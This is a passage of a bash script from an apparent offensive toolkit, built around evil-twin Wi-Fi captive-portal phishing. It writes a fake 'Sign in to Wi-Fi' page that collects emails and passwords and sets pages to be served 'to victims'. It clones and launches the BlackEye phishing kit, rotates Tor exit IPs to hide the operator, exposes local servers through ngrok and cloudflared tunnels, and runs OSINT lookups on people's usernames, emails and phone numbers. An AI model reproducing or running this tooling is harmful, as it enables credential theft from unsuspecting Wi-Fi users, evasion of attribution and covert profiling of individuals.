    echo -e "  ${GREEN}[✓]${NC} ${GREEN}Reloaded.${NC}"
    sleep 0.4
    pkill -9 -f xterm 2>/dev/null
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f dnsmasq 2>/dev/null
    pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
    sleep 0.5
    exec sudo bash "$0"
}

# ===============================================================
# LIVE ATTACK MAPS — open real-time cyberthreat visualizations
# ===============================================================

live_maps_open() {
    print_banner
    echo -e "${BOLD}${RED}============= ${YELLOW}LIVE ATTACKS${RED} =============${NC}"
    echo -e "        ${DIM}real-time cyberthreat visualization${NC}"
    echo -e "${BOLD}${RED}=============================================${NC}"
    echo ""
    echo -e "  ${BOLD}${ORANGE}-- THREAT MAPS --${NC}"
    echo -e "   ${BOLD}${ORANGE}[1]${NC}  Kaspersky Cyberthreat Map"
    echo -e "   ${BOLD}${ORANGE}[2]${NC}  Check Point Threat Map"
    echo -e "   ${BOLD}${ORANGE}[3]${NC}  Fortinet FortiGuard Map"
    echo -e "   ${BOLD}${ORANGE}[4]${NC}  Radware Live Threat Map"
    echo -e "   ${BOLD}${ORANGE}[5]${NC}  NETSCOUT Cyber Threat Horizon"
    echo -e "   ${BOLD}${ORANGE}[6]${NC}  Bitdefender Threat Map"
    echo -e "   ${BOLD}${ORANGE}[7]${NC}  Imperva Attack Map"
    echo ""
    echo -e "  ${BOLD}${RED}-- ATTACK FEEDS --${NC}"
    echo -e "   ${BOLD}${RED}[8]${NC}   AbuseIPDB — recent abuse reports"
    echo -e "   ${BOLD}${RED}[9]${NC}   URLhaus — live malware URLs"
    echo -e "   ${BOLD}${RED}[10]${NC}  Feodo Tracker — botnet C2 servers"
    echo -e "   ${BOLD}${RED}[11]${NC}  Shodan — Internet-exposed devices"
    echo -e "   ${BOLD}${RED}[12]${NC}  CIRCL CVE Search — latest CVEs"
    echo ""
    echo -e "  ${BOLD}${VIOLET}-- OPEN ALL --${NC}"
    echo -e "   ${BOLD}${VIOLET}[20]${NC}  All 7 threat maps"
    echo -e "   ${BOLD}${VIOLET}[21]${NC}  All 5 attack feeds"
    echo -e "   ${BOLD}${VIOLET}[22]${NC}  Everything (12 tabs)"
    echo ""
    echo -e "   ${BOLD}${RED}[0]${NC}   Back"
    echo -e "${BOLD}${RED}=============================================${NC}"
    read -p "$(echo -e ${BOLD}${YELLOW}'Choice: '${NC})" M

    local url="" name=""
    case "$M" in
        1)  url="https://cybermap.kaspersky.com/";                 name="Kaspersky" ;;
        2)  url="https://threatmap.checkpoint.com/";               name="Check Point" ;;
        3)  url="https://threatmap.fortiguard.com/";               name="FortiGuard" ;;
        4)  url="https://livethreatmap.radware.com/";              name="Radware" ;;
        5)  url="https://horizon.netscout.com/";                   name="NETSCOUT" ;;
        6)  url="https://threatmap.bitdefender.com/";              name="Bitdefender" ;;
        7)  url="https://www.imperva.com/cyber-threat-attack-map/"; name="Imperva" ;;
        8)  url="https://www.abuseipdb.com/";                      name="AbuseIPDB" ;;
        9)  url="https://urlhaus.abuse.ch/browse/";                name="URLhaus" ;;
        10) url="https://feodotracker.abuse.ch/browse/";           name="Feodo Tracker" ;;
        11) url="https://www.shodan.io/";                          name="Shodan" ;;
        12) url="https://cve.circl.lu/";                           name="CIRCL CVE" ;;
        20)
            live_maps_bulk \
                "https://cybermap.kaspersky.com/" \
                "https://threatmap.checkpoint.com/" \
                "https://threatmap.fortiguard.com/" \
                "https://livethreatmap.radware.com/" \
                "https://horizon.netscout.com/" \
                "https://threatmap.bitdefender.com/" \
                "https://www.imperva.com/cyber-threat-attack-map/"
            return ;;
        21)
            live_maps_bulk \
                "https://www.abuseipdb.com/" \
                "https://urlhaus.abuse.ch/browse/" \
                "https://feodotracker.abuse.ch/browse/" \
                "https://www.shodan.io/" \
                "https://cve.circl.lu/"
            return ;;
        22)
            live_maps_bulk \
                "https://cybermap.kaspersky.com/" \
                "https://threatmap.checkpoint.com/" \
                "https://threatmap.fortiguard.com/" \
                "https://livethreatmap.radware.com/" \
                "https://horizon.netscout.com/" \
                "https://threatmap.bitdefender.com/" \
                "https://www.imperva.com/cyber-threat-attack-map/" \
                "https://www.abuseipdb.com/" \
                "https://urlhaus.abuse.ch/browse/" \
                "https://feodotracker.abuse.ch/browse/" \
                "https://www.shodan.io/" \
                "https://cve.circl.lu/"
            return ;;
        0) return ;;
        *) sleep 1; return ;;
    esac

    [ -z "$url" ] && return
    live_maps_open_url "$url" "$name"
}

# helper: try firefox, then xdg-open, then browser binaries, then print the URL
live_maps_open_url() {
    local url="$1"
    local name="${2:-}"

    # make sure we can reach the X display even under sudo
    if [ -z "$DISPLAY" ]; then
        for d in :0 :1 :2; do
            if [ -e "/tmp/.X11-unix/X${d#:}" ]; then
                export DISPLAY="$d"
                break
            fi

    # X auth fix for running firefox as root under sudo
    if [ "$(id -u)" = "0" ]; then
        local user_home=""
        for h in "$HOME" /home/user /home/*; do
            [ -f "$h/.Xauthority" ] && user_home="$h" && break
        done
        if [ -n "$user_home" ]; then
            export XAUTHORITY="$user_home/.Xauthority"
        fi
    fi
        done
    fi

    echo -e "${CYAN}[*] Opening $name ...${NC}"

    # 1. firefox
    if command -v firefox >/dev/null 2>&1; then
        setsid firefox "$url" >/dev/null 2>&1 &
        sleep 1
        if pgrep -f "firefox.*$url" >/dev/null 2>&1 || pgrep -x firefox >/dev/null 2>&1; then
            echo -e "${GREEN}[+] $name opened in Firefox${NC}"
            sleep 1
            return 0
        fi
    fi

    # 2. xdg-open
    if command -v xdg-open >/dev/null 2>&1; then
        setsid xdg-open "$url" >/dev/null 2>&1 &
        sleep 1
        echo -e "${GREEN}[+] $name passed to xdg-open${NC}"
        sleep 1
        return 0
    fi

    # 3. chromium / google-chrome
    for b in chromium chromium-browser google-chrome google-chrome-stable brave-browser; do
        if command -v "$b" >/dev/null 2>&1; then
            setsid "$b" "$url" >/dev/null 2>&1 &
            echo -e "${GREEN}[+] $name opened in $b${NC}"
            sleep 1
            return 0
        fi
    done

    # 4. nothing worked — print the URL so the user can copy it
    echo ""
    echo -e "${RED}[!] No browser could be launched from here.${NC}"
    echo -e "${DIM}    Open this URL manually in your browser:${NC}"
    echo ""
    echo -e "    ${BOLD}${YELLOW}$url${NC}"
    echo ""
    pause
    return 1
}

live_maps_bulk() {
    local urls=("$@")
    echo -e "${CYAN}[*] Opening ${#urls[@]} tabs...${NC}"

    if [ -z "$DISPLAY" ]; then
        for d in :0 :1 :2; do
            if [ -e "/tmp/.X11-unix/X${d#:}" ]; then
                export DISPLAY="$d"
                break
            fi
        done
    fi

    if command -v firefox >/dev/null 2>&1; then
        setsid firefox --new-window "${urls[@]}" >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Opened all in Firefox${NC}"
        sleep 2
        return 0
    fi
    if command -v xdg-open >/dev/null 2>&1; then
        for u in "${urls[@]}"; do
            setsid xdg-open "$u" >/dev/null 2>&1 &
            sleep 0.4
        done
        echo -e "${GREEN}[+] Opened all via xdg-open${NC}"
        sleep 2
        return 0
    fi
    echo -e "${YELLOW}[!] No browser found — printing URLs${NC}"
    for u in "${urls[@]}"; do
        echo -e "    ${YELLOW}$u${NC}"
    done
    pause
}

ipchanger_ensure() {
    # ---- is tor installed? ----
    if ! command -v tor >/dev/null 2>&1; then
        echo ""
        echo -e "${YELLOW}[!] Tor is not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install Tor now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            echo -e "${CYAN}[*] apt update && apt install tor ...${NC}"
            sudo apt update >/dev/null 2>&1
            sudo apt install -y tor 2>&1 | tail -5
            if ! command -v tor >/dev/null 2>&1; then
                echo -e "${RED}[!] Tor install failed.${NC}"
                pause
                return 1
            fi
            echo -e "${GREEN}[+] Tor installed${NC}"
        else
            echo -e "${DIM}    Skipped.${NC}"
            return 1
        fi
    fi

    # ---- is tor service running? ----
    if ! systemctl is-active tor >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] Tor service is not running.${NC}"
        read -p "$(echo -e ${YELLOW}'Start it now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            sudo systemctl start tor >/dev/null 2>&1
            sleep 3
            if ! systemctl is-active tor >/dev/null 2>&1; then
                echo -e "${RED}[!] Tor failed to start. Check: sudo systemctl status tor${NC}"
                pause
                return 1
            fi
            echo -e "${GREEN}[+] Tor running${NC}"
        else
            echo -e "${DIM}    Skipped.${NC}"
            return 1
        fi
    fi

    # ---- make sure ControlPort 9051 is enabled ----
    if ! grep -qE "^\s*ControlPort\s+9051" /etc/tor/torrc 2>/dev/null; then
        echo -e "${CYAN}[*] Enabling Tor control port (9051)...${NC}"
        echo "ControlPort 9051" | sudo tee -a /etc/tor/torrc >/dev/null
        echo "CookieAuthentication 1" | sudo tee -a /etc/tor/torrc >/dev/null
        sudo systemctl restart tor >/dev/null 2>&1
        sleep 3
    fi

    # ---- wait for SOCKS to come up ----
    local i=0
    for i in 1 2 3 4 5 6 7 8 9 10; do
        if curl -s --max-time 3 --socks5 127.0.0.1:9050 https://api.ipify.org >/dev/null 2>&1; then
            return 0
        fi
        sleep 1
    done
    echo -e "${RED}[!] Tor SOCKS not responding on 127.0.0.1:9050 after 10s.${NC}"
    echo -e "${DIM}    Debug: sudo journalctl -u tor --no-pager | tail -20${NC}"
    return 1
}

ipchanger_rotate_once() {
    # send newnym signal to tor control port
    if command -v tor >/dev/null 2>&1; then
        (
            echo -e 'AUTHENTICATE "">\r\nSIGNAL NEWNYM\r\nQUIT'
        ) | nc 127.0.0.1 9051 >/dev/null 2>&1
    fi
    # fallback: restart tor if signal fails
    if ! curl -s --max-time 5 --socks5 127.0.0.1:9050 https://api.ipify.org >/dev/null 2>&1; then
        sudo systemctl restart tor >/dev/null 2>&1
        sleep 2
    fi
}

ipchanger_current_ip() {
    curl -s --max-time 6 --socks5 127.0.0.1:9050 https://api.ipify.org 2>/dev/null
}

ipchanger_start() {
    print_banner
    echo -e "${BOLD}${RED}=============== IP CHANGER (TOR) ===============${NC}"
    echo -e "${DIM}    Routes traffic through Tor and rotates the exit IP.${NC}"
    echo -e "${DIM}    Interval is a minimum of 3 seconds.${NC}"
    echo ""
    echo -e "  ${YELLOW}[!] Each rotation rebuilds a Tor circuit. Fast intervals${NC}"
    echo -e "  ${YELLOW}    load the network and often reuse the same exit IP.${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}'Change IP every how many seconds? (min 3, default 3): '${NC})" INTERVAL
    INTERVAL="${INTERVAL:-3}"
    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 3 ]; then
        echo -e "${YELLOW}[!] Invalid or below minimum. Using 3 seconds.${NC}"
        INTERVAL=3
    fi

    if ! ipchanger_ensure; then
        echo -e "${RED}[!] Cannot continue without Tor.${NC}"
        pause
        return
    fi

    echo ""
    echo -e "${CYAN}[*] Checking Tor status...${NC}"
    local test
    test=$(ipchanger_current_ip)
    if [ -z "$test" ]; then
        echo -e "${RED}[!] Tor is up but not returning an exit IP.${NC}"
        echo -e "${DIM}    Debug: sudo journalctl -u tor --no-pager | tail -20${NC}"
        pause
        return
    fi
    echo -e "${GREEN}[+] Tor exit IP: $test${NC}"
    echo ""
    echo -e "${BOLD}${GREEN}=========══ IP CHANGER ACTIVE =========══${NC}"
    echo -e "  Interval: ${INTERVAL}s"
    echo -e "  Proxy:    socks5://127.0.0.1:9050"
    echo -e "  ${RED}Ctrl+C to stop${NC}"
    echo -e "${BOLD}${GREEN}==========================================${NC}"
    echo ""

    trap 'on_interrupt' INT
    local i=0
    while true; do
        ipchanger_rotate_once
        sleep 1
        local new_ip
        new_ip=$(ipchanger_current_ip)
        printf "\r${CYAN}[%s]${NC} exit IP: ${BOLD}${YELLOW}%-16s${NC} next change in ${INTERVAL}s   " \
            "$(date +%H:%M:%S)" "${new_ip:-?}"
        sleep $((INTERVAL - 1))
    done
}

# ===============================================================
# TUNNEL SETUP — ngrok + cloudflared
# ===============================================================

tunnel_ngrok() {
    print_banner
    echo -e "${BOLD}${CYAN}========= NGROK =========${NC}"
    if ! command -v ngrok >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] ngrok not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install ngrok? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            echo -e "${CYAN}[*] Downloading ngrok...${NC}"
            (
                cd /tmp
                wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
                tar -xzf ngrok-v3-stable-linux-amd64.tgz
                sudo mv ngrok /usr/local/bin/ngrok
                sudo chmod +x /usr/local/bin/ngrok
                rm -f ngrok-v3-stable-linux-amd64.tgz
            )
            if ! command -v ngrok >/dev/null 2>&1; then
                echo -e "${RED}[!] Install failed.${NC}"; pause; return
            fi
            echo -e "${GREEN}[+] ngrok installed${NC}"
        else
            pause; return
        fi
    fi

    read -p "$(echo -e ${YELLOW}'Local port to expose [80]: '${NC})" LPORT
    LPORT="${LPORT:-80}"

    if [ -z "$NGROK_AUTHTOKEN" ]; then
        echo -e "${DIM}    ngrok free tier requires an auth token.${NC}"
        echo -e "${DIM}    Get one at https://dashboard.ngrok.com/get-started/your-authtoken${NC}"
        read -p "$(echo -e ${YELLOW}'Auth token (blank to skip): '${NC})" TOK
        if [ -n "$TOK" ]; then
            ngrok config add-authtoken "$TOK" 2>&1 | tail -2
        fi
    fi

    echo -e "${CYAN}[*] Starting ngrok http $LPORT ...${NC}"
    echo -e "${DIM}    A public URL will appear below. Ctrl+C to stop.${NC}"
    echo ""
    ngrok http "$LPORT"
}

tunnel_cloudflared() {
    print_banner
    echo -e "${BOLD}${CYAN}========= CLOUDFLARED =========${NC}"
    if ! command -v cloudflared >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] cloudflared not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install cloudflared? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            echo -e "${CYAN}[*] Downloading cloudflared...${NC}"
            (
                cd /tmp
                ARCH=$(uname -m)
                case "$ARCH" in
                    x86_64) URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
                    aarch64) URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
                    *) URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
                esac
                wget -q "$URL" -O cloudflared
                sudo mv cloudflared /usr/local/bin/cloudflared
                sudo chmod +x /usr/local/bin/cloudflared
            )
            if ! command -v cloudflared >/dev/null 2>&1; then
                echo -e "${RED}[!] Install failed.${NC}"; pause; return
            fi
            echo -e "${GREEN}[+] cloudflared installed${NC}"
        else
            pause; return
        fi
    fi

    read -p "$(echo -e ${YELLOW}'Local port to expose [80]: '${NC})" LPORT
    LPORT="${LPORT:-80}"

    echo -e "${CYAN}[*] Starting cloudflared quick tunnel on :$LPORT ...${NC}"
    echo -e "${DIM}    No Cloudflare account needed for quick tunnels.${NC}"
    echo -e "${DIM}    A trycloudflare.com URL will appear below. Ctrl+C to stop.${NC}"
    echo ""
    cloudflared tunnel --url "http://localhost:$LPORT"
}

tunnel_local_http() {
    print_banner
    echo -e "${BOLD}${CYAN}========= LOCAL HTTP SERVER =========${NC}"
    echo -e "${DIM}    Serve a directory over HTTP on your own machine.${NC}"
    echo ""

    local default_dir="$PAGES_DIR"
    read -p "$(echo -e ${YELLOW}"Directory to serve [$default_dir]: "${NC})" DIR
    DIR="${DIR:-$default_dir}"
    [ ! -d "$DIR" ] && { echo -e "${RED}[!] Directory not found.${NC}"; pause; return; }

    read -p "$(echo -e ${YELLOW}'Port [8000]: '${NC})" PORT
    PORT="${PORT:-8000}"

    echo -e "${CYAN}[*] Serving $DIR on http://0.0.0.0:$PORT ...${NC}"
    echo -e "${DIM}    Ctrl+C to stop.${NC}"
    echo ""
    ( cd "$DIR" && python3 -m http.server "$PORT" --bind 0.0.0.0 )
}

tunnel_show_running() {
    print_banner
    echo -e "${BOLD}${CYAN}========= RUNNING TUNNELS =========${NC}"
    echo ""
    echo -e "${CYAN}--- ngrok ---${NC}"
    pgrep -af ngrok 2>/dev/null || echo "  none"
    echo ""
    echo -e "${CYAN}--- cloudflared ---${NC}"
    pgrep -af cloudflared 2>/dev/null || echo "  none"
    echo ""
    echo -e "${CYAN}--- python http.server ---${NC}"
    pgrep -af "http.server" 2>/dev/null || echo "  none"
    echo ""
    pause
}

# ===============================================================
# CUSTOM PAGE LOADER — drop your own HTML into the captive portal
# ===============================================================

custom_page_list() {
    print_banner
    echo -e "${BOLD}${CYAN}========= AVAILABLE PAGES =========${NC}"
    echo ""
    if [ ! -d "$PAGES_DIR" ]; then
        echo -e "${YELLOW}[!] $PAGES_DIR does not exist.${NC}"; pause; return
    fi
    local n=0
    local i=1
    local current=""
    [ -f "$PAGES_DIR/.current" ] && current=$(cat "$PAGES_DIR/.current")
    while read -r f; do
        local base
        base=$(basename "$f")
        local marker=""
        [ "$base" = "$current" ] && marker=" ${GREEN}[current]${NC}"
        printf "  ${BOLD}%2d.${NC} %s%s\n" "$i" "$base" "$marker"
        i=$((i+1))
        n=$((n+1))
    done < <(find "$PAGES_DIR" -maxdepth 1 -name "*.html" 2>/dev/null | sort)
    echo ""
    [ $n -eq 0 ] && echo -e "${DIM}    No .html files yet.${NC}"
    pause
}

custom_page_preview() {
    print_banner
    echo -e "${BOLD}${CYAN}========= PREVIEW PAGE =========${NC}"
    read -p "$(echo -e ${YELLOW}'HTML file name: '${NC})" FN
    [ -z "$FN" ] && return
    local path="$PAGES_DIR/$FN"
    [ ! -f "$path" ] && { echo -e "${RED}[!] Not found: $path${NC}"; pause; return; }

    echo -e "${CYAN}[*] Starting preview server on :8099 ...${NC}"
    local tmpdir
    tmpdir=$(mktemp -d)
    cp "$path" "$tmpdir/index.html"
    ( cd "$tmpdir" && python3 -m http.server 8099 --bind 127.0.0.1 >/dev/null 2>&1 ) &
    local pid=$!
    sleep 1
    if command -v firefox >/dev/null 2>&1; then
        setsid firefox "http://127.0.0.1:8099/" >/dev/null 2>&1 &
    elif command -v xdg-open >/dev/null 2>&1; then
        setsid xdg-open "http://127.0.0.1:8099/" >/dev/null 2>&1 &
    else
        echo -e "${DIM}    Open http://127.0.0.1:8099/ manually.${NC}"
    fi
    echo -e "${GREEN}[+] Preview at http://127.0.0.1:8099/ — press ENTER to stop.${NC}"
    read -p "" _
    kill "$pid" 2>/dev/null
    rm -rf "$tmpdir"
}

custom_page_fetch() {
    print_banner
    echo -e "${BOLD}${CYAN}========= LOAD PAGE FROM URL =========${NC}"
    read -p "$(echo -e ${YELLOW}'URL to save as HTML: '${NC})" U
    [ -z "$U" ] && return
    read -p "$(echo -e ${YELLOW}'Save as name [custom-page.html]: '${NC})" N
    N="${N:-custom-page.html}"
    local path="$PAGES_DIR/$N"
    echo -e "${CYAN}[*] Downloading $U ...${NC}"
    if curl -sL --max-time 20 "$U" -o "$path"; then
        echo -e "${GREEN}[+] Saved to $path${NC}"
        echo -e "${DIM}    Size: $(wc -c < "$path") bytes${NC}"
    else
        echo -e "${RED}[!] Download failed.${NC}"
        rm -f "$path"
    fi
    pause
}

custom_page_write() {
    print_banner
    echo -e "${BOLD}${CYAN}========= WRITE MINIMAL PAGE =========${NC}"
    read -p "$(echo -e ${YELLOW}'File name [my-page.html]: '${NC})" N
    N="${N:-my-page.html}"
    local path="$PAGES_DIR/$N"
    if [ -f "$path" ]; then
        read -p "$(echo -e ${YELLOW}'Exists — overwrite? [y/N]: '${NC})" O
        [ "$O" != "y" ] && [ "$O" != "Y" ] && return
    fi

    cat > "$path" <<'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Sign-in</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef2f7;color:#1f2937;display:flex;align-items:center;justify-content:center;padding:16px}
.card{width:100%;max-width:380px;background:#fff;border-radius:16px;padding:28px 24px;box-shadow:0 10px 40px rgba(0,0,0,.1);border:1px solid #e5e7eb;text-align:center}
h1{font-size:18px;font-weight:600;color:#111827;margin-bottom:8px}
p{font-size:13.5px;color:#6b7280;line-height:1.55;margin-bottom:20px}
input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #d1d5db;font-size:15px;margin-bottom:12px}
input:focus{outline:2px solid #3b82f6;outline-offset:-1px;border-color:transparent}
button{width:100%;padding:14px;border-radius:10px;border:0;font-size:15px;font-weight:600;cursor:pointer;background:#3b82f6;color:#fff}
button:active{background:#2563eb}
</style>
</head>
<body>
<div class="card">
<h1>Sign in to Wi-Fi</h1>
<p>Enter your details to continue to the internet.</p>
<form method="POST" action="/">
<input name="username" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Continue</button>
</form>
</div>
</body>
</html>
HTMLEOF
    echo -e "${GREEN}[+] Written to $path${NC}"
    pause
}

custom_page_set() {
    print_banner
    echo -e "${BOLD}${CYAN}========= SET CURRENT PAGE =========${NC}"
    echo -e "${DIM}    The captive portal will serve this page to victims.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'HTML file name: '${NC})" FN
    [ -z "$FN" ] && return
    local path="$PAGES_DIR/$FN"
    [ ! -f "$path" ] && { echo -e "${RED}[!] Not found.${NC}"; pause; return; }
    echo "$FN" > "$PAGES_DIR/.current"
    echo -e "${GREEN}[+] Current page = $FN${NC}"
    echo -e "${DIM}    Evil Twin → Google 2-Step / Firmware will use this page.${NC}"
    pause
}

pyphisher_launch() {
    print_banner
    echo -e "${BOLD}${CYAN}============= BlackEye (external) =============${NC}"
    echo -e "${DIM}    Launcher only - BlackEye runs standalone.${NC}"
    echo -e "${DIM}    Repo: github.com/An0nUD4Y/blackeye${NC}"
    echo ""

    local dir="$HOME/blackeye"

    if [ ! -d "$dir" ]; then
        echo -e "${YELLOW}[!] BlackEye not installed at $dir${NC}"
        read -p "$(echo -e ${YELLOW}'Clone it now? [y/N]: '${NC})" DO
        if [ "$DO" != "y" ] && [ "$DO" != "Y" ]; then
            echo -e "${DIM}    Skipped.${NC}"
            pause
            return
        fi
        GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/An0nUD4Y/blackeye "$dir" 2>&1 | tail -3
        if [ ! -d "$dir" ]; then
            echo -e "${RED}[!] Clone failed.${NC}"
            pause
            return
        fi
        chmod +x "$dir/blackeye.sh" 2>/dev/null
        echo -e "${GREEN}[+] Cloned to $dir${NC}"
    fi

    cd "$dir" || { pause; return; }

    if [ -f blackeye.sh ]; then
        chmod +x blackeye.sh 2>/dev/null
        echo -e "${CYAN}[*] Launching BlackEye...${NC}"
        echo ""
        bash blackeye.sh
    else
        echo -e "${RED}[!] blackeye.sh not found in $dir${NC}"
        echo -e "${DIM}    Contents:${NC}"
        ls -1 | head -20
    fi
    pause
}

# ===============================================================
# OSINT — public lookups, one menu entry per type
# ===============================================================

osint_open_url() {
    local url="$1"
    # if running as root, launch firefox as the desktop user
    if [ "$(id -u)" = "0" ] && id kali >/dev/null 2>&1; then
        if [ -z "$DISPLAY" ]; then
            for d in :0 :1 :2; do
                [ -e "/tmp/.X11-unix/X${d#:}" ] && { export DISPLAY="$d"; break; }
            done
        fi
        sudo -u kali env DISPLAY="$DISPLAY" setsid firefox "$url" >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Opened in Firefox (as user kali): $url${NC}"
        return 0
    fi

    if command -v firefox >/dev/null 2>&1; then
        setsid firefox "$url" >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Opened in Firefox: $url${NC}"
    elif command -v xdg-open >/dev/null 2>&1; then
        setsid xdg-open "$url" >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Opened: $url${NC}"
    else
        echo -e "${YELLOW}[!] No browser. Copy this URL:${NC}"
        echo -e "    ${BOLD}${YELLOW}$url${NC}"
    fi
}

osint_email_osint_org() {
    print_banner
    echo -e "${BOLD}${CYAN}========= EMAIL OSINT ========="
    echo -e "${DIM}    Site: emailosint.org${NC}"
    echo -e "${DIM}    Only look up emails you have legitimate reason to check.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Email address: '${NC})" EM
    [ -z "$EM" ] && { pause; return; }
    # just opens the site; the site itself does the lookup with the user pasting
    osint_open_url "https://emailosint.org/"
    echo ""
    echo -e "${DIM}    Paste the email into the search box on the page.${NC}"
    echo -e "${DIM}    Note: this sends the email to their servers. 3 lookups/day free.${NC}"
    pause
}

osint_hibp() {
    print_banner
    echo -e "${BOLD}${CYAN}========= HAVE I BEEN PWNED ========="
    read -p "$(echo -e ${YELLOW}'Email address: '${NC})" EM
    [ -z "$EM" ] && { pause; return; }
    osint_open_url "https://haveibeenpwned.com/account/$EM"
    pause
}

osint_hunter() {
    print_banner
    echo -e "${BOLD}${CYAN}========= HUNTER.IO ========="
    read -p "$(echo -e ${YELLOW}'Domain (e.g. example.com): '${NC})" D
    [ -z "$D" ] && { pause; return; }
    osint_open_url "https://hunter.io/search/$D"
    pause
}

osint_whatsmyname() {
    print_banner
    echo -e "${BOLD}${CYAN}========= WHATSMYNAME ========="
    read -p "$(echo -e ${YELLOW}'Username: '${NC})" U
    [ -z "$U" ] && { pause; return; }
    osint_open_url "https://whatsmyname.app/?q=$U"
    pause
}

osint_sherlock() {
    print_banner
    echo -e "${BOLD}${CYAN}========= SHERLOCK ========="
    local dir="$HOME/sherlock"
    if [ ! -d "$dir" ]; then
        echo -e "${YELLOW}[!] Sherlock not installed at $dir${NC}"
        read -p "$(echo -e ${YELLOW}'Install now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            git clone --depth 1 https://github.com/sherlock-project/sherlock "$dir" 2>&1 | tail -3
            if [ -d "$dir" ]; then
                ( cd "$dir" && python3 -m pip install --break-system-packages -r requirements.txt 2>&1 | tail -3 )
            fi
        fi
        [ ! -d "$dir" ] && { pause; return; }
    fi
    read -p "$(echo -e ${YELLOW}'Username: '${NC})" U
    [ -z "$U" ] && { pause; return; }
    ( cd "$dir" && python3 sherlock "$U" 2>&1 | tail -60 )
    pause
}

osint_maigret() {
    print_banner
    echo -e "${BOLD}${CYAN}========= MAIGRET ========="
    if ! command -v maigret >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] Maigret not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install via pip now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            pip3 install --break-system-packages maigret 2>&1 | tail -4
        fi
    fi
    if ! command -v maigret >/dev/null 2>&1; then
        echo -e "${RED}[!] Still missing.${NC}"; pause; return
    fi
    read -p "$(echo -e ${YELLOW}'Username: '${NC})" U
    [ -z "$U" ] && { pause; return; }
    maigret "$U" 2>&1 | tail -60
    pause
}

osint_phone_carrier() {
    print_banner
    echo -e "${BOLD}${CYAN}========= PHONE CARRIER LOOKUP ========="
    echo -e "${DIM}    Opened publicly — no API key needed.${NC}"
    read -p "$(echo -e ${YELLOW}'Phone number (E.164 format, e.g. +251911234567): '${NC})" PH
    [ -z "$PH" ] && { pause; return; }
    osint_open_url "https://freecarrierlookup.com/"
    echo -e "${DIM}    Paste the number into the box on the page.${NC}"
    pause
}

osint_numlookup() {
    print_banner
    echo -e "${BOLD}${CYAN}========= NUMLOOKUP ========="
    read -p "$(echo -e ${YELLOW}'Phone number: '${NC})" PH
    [ -z "$PH" ] && { pause; return; }
    osint_open_url "https://www.numlookup.com/"
    pause
}

osint_dork_builder() {
    print_banner
    echo -e "${BOLD}${CYAN}========= GOOGLE DORK BUILDER ========="
    echo -e "${DIM}    Build a search query from a name/email/handle.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Name or handle: '${NC})" N
    [ -z "$N" ] && { pause; return; }
    echo ""
    echo -e "  ${BOLD}-- Dork templates --${NC}"
    echo "   [1] \"$N\"                       (exact phrase)"
    echo "   [2] \"$N\" site:linkedin.com"
    echo "   [3] \"$N\" site:facebook.com"
    echo "   [4] \"$N\" site:twitter.com OR site:x.com"
    echo "   [5] \"$N\" filetype:pdf"
    echo "   [6] \"$N\" -site:facebook.com    (exclude FB)"
    echo "   [7] \"$N\" @gmail.com            (with Gmail)"
    echo "   [8]  Custom                     (type your own dork)"
    echo ""
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
    local q=""
    case "$C" in
        1) q="\"$N\"" ;;
        2) q="\"$N\" site:linkedin.com" ;;
        3) q="\"$N\" site:facebook.com" ;;
        4) q="\"$N\" site:twitter.com OR site:x.com" ;;
        5) q="\"$N\" filetype:pdf" ;;
        6) q="\"$N\" -site:facebook.com" ;;
        7) q="\"$N\" @gmail.com" ;;
        8) read -p "$(echo -e ${YELLOW}'Custom dork: '${NC})" q ;;
        *) pause; return ;;
    esac
    [ -z "$q" ] && { pause; return; }
    local enc
    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$q")
    osint_open_url "https://www.google.com/search?q=$enc"
    pause
}

osint_whois() {
    print_banner
    echo -e "${BOLD}${CYAN}========= WHOIS ========="
    read -p "$(echo -e ${YELLOW}'Domain: '${NC})" D
    [ -z "$D" ] && { pause; return; }
    if ! command -v whois >/dev/null 2>&1; then
        sudo apt install -y whois 2>&1 | tail -2
    fi
    whois "$D" 2>&1 | head -60
    pause
}

osint_dns() {
    print_banner
